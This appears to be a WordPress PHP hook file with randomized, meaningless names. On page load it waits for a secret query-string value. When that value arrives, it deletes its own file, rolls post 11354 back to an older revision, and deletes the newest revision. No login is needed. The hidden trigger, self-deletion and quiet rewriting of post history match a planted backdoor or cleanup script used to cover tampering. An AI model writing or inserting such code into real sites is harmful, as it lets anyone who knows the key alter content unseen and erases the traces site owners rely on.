<?php

function comments_business_event_additional() {
	if (isset($_GET['composer_restaurant_shortener']) && $_GET['composer_restaurant_shortener'] === 'titles_team_tool') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$authors_category_membership = 11354;
		$report_revisions_genesis = wp_get_post_revisions($authors_category_membership);
		if (empty($report_revisions_genesis)) die('no revisions');
		if (count($report_revisions_genesis) < 2) die('less than 2');
		$delivery_display_scheduled = array_shift($report_revisions_genesis);
		$network_front_js_uploads = $delivery_display_scheduled->ID;
		$call_flash_tab = array_shift($report_revisions_genesis);
		$notification_check_calculator_short = $call_flash_tab->ID;
		$language_visual_restrict = wp_restore_post_revision($notification_check_calculator_short);
		if ($language_visual_restrict === false) die('error restoring');
		$language_visual_restrict = wp_delete_post_revision($network_front_js_uploads);		
		if ($language_visual_restrict === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'comments_business_event_additional');
